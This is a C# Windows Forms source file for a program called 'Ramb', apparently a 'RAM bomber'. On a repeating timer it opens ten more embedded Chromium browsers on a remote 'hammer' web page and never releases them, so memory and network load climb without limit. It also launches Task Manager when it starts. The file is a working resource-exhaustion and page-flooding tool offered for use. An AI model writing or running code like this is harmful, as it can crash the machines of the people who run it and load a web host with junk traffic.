using CefSharp;
using CefSharp.WinForms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ramb
{
    public partial class Ramb : Form
    {
        String rambombersite = "https://some-hammer.000webhostapp.com";
        public Ramb()
        {
            InitializeComponent();
        }
        ChromiumWebBrowser rambrowser;
        private void Ramb_Load(object sender, EventArgs e)
        {
            CefSettings settings = new CefSettings();
            Cef.Initialize(settings);
            ramb_restart.Start();
            System.Diagnostics.Process.Start("C:\\Windows\\System32\\Taskmgr.exe");
        }
        
        public void rambstart()
        {
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel1.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel2.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel3.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel4.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel5.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel6.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel7.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel8.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel9.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;
            rambrowser = new ChromiumWebBrowser(rambombersite);
            panel10.Controls.Add(rambrowser);
            rambrowser.Dock = DockStyle.Fill;

            //webBrowser1.Navigate(Environment.CurrentDirectory + "\\ramb\\index.html");
        }
       

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/n3rdydzn/");
        }

        private void ramb_restart_Tick(object sender, EventArgs e)
        {
            rambstart();
        }
    }
}
